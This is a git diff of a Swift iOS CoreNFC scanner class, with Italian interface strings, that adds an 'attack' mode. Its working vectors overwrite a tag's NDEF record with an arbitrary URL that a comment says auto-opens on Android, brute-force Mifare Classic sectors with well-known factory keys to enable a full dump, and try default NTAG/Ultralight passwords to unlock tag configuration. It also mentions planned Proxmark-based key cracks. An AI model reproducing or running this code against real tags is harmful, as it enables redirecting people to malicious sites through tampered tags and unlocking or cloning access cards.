@@ -396,13 +396,216 @@ final class NFCScanner: NSObject, NFCNDEFReaderSessionDelegate, NFCTagReaderSess
             finishScan(buffer.isEmpty ? nil : NFCDump(uid: buffer.first ?? "?", family: "?", pages: [], ndefHex: [], ndefText: [], kind: "Partial"))
         }
         if replayCont != nil { finishReplay(replayBuffer) }
+        if detectCont != nil { finishDetect(nil) }
+        if attackCont != nil { finishAttack(attackBuffer.isEmpty ? ["sessione scaduta — riavvicina il tag entro il tempo limite"] : attackBuffer) }
     }
 
     func tagReaderSessionDidBecomeActive(_ session: NFCTagReaderSession) {}
 
+    private var goal: Goal = .none
+    private var detectCont: CheckedContinuation<NFCTagInfo?, Never>?
+    private var attackCont: CheckedContinuation<[String], Never>?
+    private var attackBuffer: [String] = []
+
+    enum Goal {
+        case none, detect
+        case attack(String, [String: String])
+    }
+
+    struct NFCTagInfo: Identifiable {
+        var id: String { uid }
+        let uid: String
+        let family: String
+        let ndefWritable: Bool
+    }
+
+    func detect(timeout: TimeInterval = 20) async -> NFCTagInfo? {
+        guard NFCNDEFReaderSession.readingAvailable else { return nil }
+        goal = .detect
+        return await withCheckedContinuation { c in
+            detectCont = c
+            session = NFCTagReaderSession(pollingOption: [.iso14443], delegate: self, queue: nil)
+            session?.alertMessage = "Avvicina il tag da analizzare…"
+            session?.begin()
+            DispatchQueue.main.asyncAfter(deadline: .now() + timeout) { [weak self] in
+                guard let self, self.detectCont != nil else { return }
+                self.session?.invalidate()
+            }
+        }
+    }
+
+    func attack(_ vector: String, config: [String: String], timeout: TimeInterval = 25) async -> [String] {
+        guard NFCNDEFReaderSession.readingAvailable else { return ["NFC reader unavailable"] }
+        goal = .attack(vector, config)
+        attackBuffer = []
+        return await withCheckedContinuation { c in
+            attackCont = c
+            session = NFCTagReaderSession(pollingOption: [.iso14443], delegate: self, queue: nil)
+            session?.alertMessage = "Riavvicina il tag per eseguire l'attacco…"
+            session?.begin()
+            DispatchQueue.main.asyncAfter(deadline: .now() + timeout) { [weak self] in
+                guard let self, self.attackCont != nil else { return }
+                self.session?.invalidate()
+            }
+        }
+    }
+
+    private func finishDetect(_ i: NFCTagInfo?) {
+        session?.invalidate()
+        let c = detectCont
+        detectCont = nil
+        goal = .none
+        c?.resume(returning: i)
+    }
+
+    private func finishAttack(_ l: [String]) {
+        session?.invalidate()
+        let c = attackCont
+        attackCont = nil
+        goal = .none
+        c?.resume(returning: l)
+    }
+
+    private func familyName(_ f: NFCMiFareFamily) -> String {
+        switch f {
+        case .ultralight: return "NTAG/Ultralight"
+        case .desfire: return "DESFire"
+        default: return "Mifare Classic"
+        }
+    }
+
+    private func mifare(_ m: NFCMiFareTag, _ pkt: Data) async -> (Data, Error?) {
+        await withCheckedContinuation { c in
+            m.sendMiFareCommand(commandPacket: pkt) { result in
+                switch result {
+                case .success(let d): c.resume(returning: (d, nil))
+                case .failure(let e): c.resume(returning: (Data(), e))
+                }
+            }
+        }
+    }
+
+    private func probeClassicKeys(_ m: NFCMiFareTag) async -> [String] {
+        let keys = ["FFFFFFFFFFFF", "A0A1A2A3A4A5", "D3F7D3F7D3F7"]
+        var out = ["target Mifare Classic uid=\(m.identifier.hexPreview)",
+                   "auth probe settore 4 con chiavi di fabbrica:"]
+        for k in keys {
+            guard let kd = Data(hexString: k), kd.count == 6 else { continue }
+            let pkt = Data([0x60, UInt8(16)]) + kd + m.identifier.prefix(4)
+            let r = await mifare(m, pkt)
+            if r.1 == nil, r.0.count >= 4 {
+                out.append("KEY FOUND: \(k) — settore 4 aperto con chiave standard → dump pieno possibile")
+                return out
+            }
+        }
+        out.append("nessuna chiave default valida — serve darkside/nested da Proxmark (PLAN)")
+        return out
+    }
+
+    private func probeNTAGPwd(_ m: NFCMiFareTag) async -> [String] {
+        let pwds = ["FFFFFFFF", "00000000", "A0A1A2A3", "41424344"]
+        var out = ["target NTAG/Ultralight uid=\(m.identifier.hexPreview)",
+                   "PWD dictionary probe:"]
+        for p in pwds {
+            guard let d = Data(hexString: p) else { continue }
+            let r = await mifare(m, Data([0x1B]) + d)
+            if r.1 == nil, r.0.count >= 2 {
+                out.append("PWD FOUND: \(p) — PACK=\(r.0.hexPreview) → CFG scrivibile dopo auth")
+                return out
+            }
+        }
+        out.append("nessuna PWD default valida")
+        return out
+    }
+
+    private func buildURIRecord(_ uri: String) -> CoreNFC.NFCNDEFPayload {
+        var payload = Data()
+        let pfx: UInt8
+        let rest: String
+        if uri.hasPrefix("https://") { pfx = 0x04; rest = String(uri.dropFirst(8)) }
+        else if uri.hasPrefix("http://") { pfx = 0x03; rest = String(uri.dropFirst(7)) }
+        else { pfx = 0x00; rest = uri }
+        payload.append(pfx)
+        payload.append(Data(rest.utf8))
+        return CoreNFC.NFCNDEFPayload(format: CoreNFC.NFCTypeNameFormat.nfcWellKnown,
+                                      type: Data("U".utf8), identifier: Data(), payload: payload)
+    }
+
     func tagReaderSession(_ session: NFCTagReaderSession, didDetect tags: [NFCTag]) {
-        if replayCont != nil { handleReplay(tags, session); return }
+        switch goal {
+        case .detect:
+            handleDetect(tags, session)
+        case .attack(let v, let cfg):
+            handleAttack(v, cfg, tags, session)
+        case .none:
+            if replayCont != nil { handleReplay(tags, session); return }
+            handleDump(tags, session)
+        }
+    }
+
+    private func handleDetect(_ tags: [NFCTag], _ session: NFCTagReaderSession) {
         guard let t = tags.first, case let .miFare(m) = t else {
+            session.alertMessage = "tag non supportato"
+            session.invalidate()
+            finishDetect(nil)
+            return
+        }
+        let fam = familyName(m.mifareFamily)
+        m.queryNDEFStatus { [weak self] (st: CoreNFC.NFCNDEFStatus, _: Int, _: (any Error)?) in
+            guard let self else { return }
+            let info = NFCTagInfo(uid: m.identifier.hexPreview, family: fam,
+                                  ndefWritable: st == CoreNFC.NFCNDEFStatus.readWrite)
+            session.alertMessage = "tag: \(fam)"
+            self.finishDetect(info)
+        }
+    }
+
+    private func handleAttack(_ vector: String, _ cfg: [String: String],
+                              _ tags: [NFCTag], _ session: NFCTagReaderSession) {
+        guard let t = tags.first, case let .miFare(m) = t else {
+            session.alertMessage = "tag non riconosciuto"
+            session.invalidate()
+            finishAttack(["tag non riconosciuto"])
+            return
+        }
+        let fam = familyName(m.mifareFamily)
+        switch vector {
+        case "ndef_inject":
+            guard let url = cfg["url"], !url.isEmpty else { finishAttack(["URL mancante"]); return }
+            let msg = NFCNDEFMessage(records: [buildURIRecord(url)])
+            m.writeNDEF(msg) { [weak self] err in
+                var lines = ["target \(fam) uid=\(m.identifier.hexPreview)", "payload: \(url)"]
+                if let err {
+                    lines.append("write FAIL: \(err.localizedDescription)")
+                } else {
+                    lines.append("NDEF INJECTED ✓ — il tag ora serve l'URL (auto-open su Android)")
+                }
+                self?.finishAttack(lines)
+            }
+        case "mifare_keys":
+            guard fam == "Mifare Classic" else {
+                finishAttack(["richiede Mifare Classic — questo tag è \(fam)"]); return
+            }
+            Task {
+                let lines = await self.probeClassicKeys(m)
+                self.finishAttack(lines)
+            }
+        case "ntag_pwd":
+            guard fam == "NTAG/Ultralight" else {
+                finishAttack(["richiede NTAG/Ultralight — tag: \(fam)"]); return
+            }
+            Task {
+                let lines = await self.probeNTAGPwd(m)
+                self.finishAttack(lines)
+            }
+        case "desfire_probe":
+            finishAttack(["DESFire: CoPP crack richiede Proxmark/hardware dedicato — vettore PLAN"])
+        default:
+            finishAttack(["vettore \(vector) non eseguibile in sessione"])
+        }
+    }
+
+    private func handleDump(_ tags: [NFCTag], _ session: NFCTagReaderSession) {
             session.alertMessage = "Tag non supportato"
             session.invalidate()
             finishScan(nil)
